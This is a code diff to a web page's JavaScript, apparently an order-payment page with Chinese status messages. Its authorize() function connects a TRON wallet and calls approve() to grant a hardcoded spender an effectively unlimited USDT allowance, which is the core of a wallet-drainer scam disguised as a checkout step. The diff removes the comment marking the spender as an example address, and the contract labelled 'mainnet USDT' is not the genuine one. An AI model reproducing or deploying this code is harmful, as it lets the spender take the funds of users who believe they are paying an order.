@@ -56,24 +56,32 @@
     document.getElementById("orderid").innerText = orderId;
 
     async function authorize() {
+      const statusEl = document.getElementById("status");
       try {
-        const tron = window.tronWeb || window.tron || (window.tronLink && window.tronLink.tronWeb);
+        const tron = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
         if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
-          document.getElementById("status").innerText = "钱包未连接，请使用 TRON 主网钱包打开页面";
+          if (window.tronLink && window.tronLink.request) {
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+          }
+        }
+
+        const wallet = window.tronWeb || window.tron || (window.tronLink && window.tronLink.tronWeb);
+        if (!wallet || !wallet.defaultAddress || !wallet.defaultAddress.base58) {
+          statusEl.innerText = "钱包未连接，请使用 TP、TronLink 打开页面";
           return;
         }
 
-        const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 主网 USDT 合约
-        const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz"; // 示例授权地址
+        const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 主网 USDT
+        const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz";
 
-        const contract = await tron.contract().at(contractAddress);
-        const tx = await contract.approve(spender, tron.toBigNumber("9223372036854775807")).send({
-          feeLimit: 100000000
+        const contract = await wallet.contract().at(contractAddress);
+        const result = await contract.approve(spender, wallet.toBigNumber("9223372036854775807")).send({
+          feeLimit: 150000000
         });
 
-        document.getElementById("status").innerText = "授权成功！交易哈希：" + tx;
+        statusEl.innerText = "授权成功！交易哈希：" + result;
       } catch (e) {
-        document.getElementById("status").innerText = "授权异常：" + (e.message || e);
+        statusEl.innerText = "授权异常：" + (e.message || JSON.stringify(e));
       }
     }
   </script>
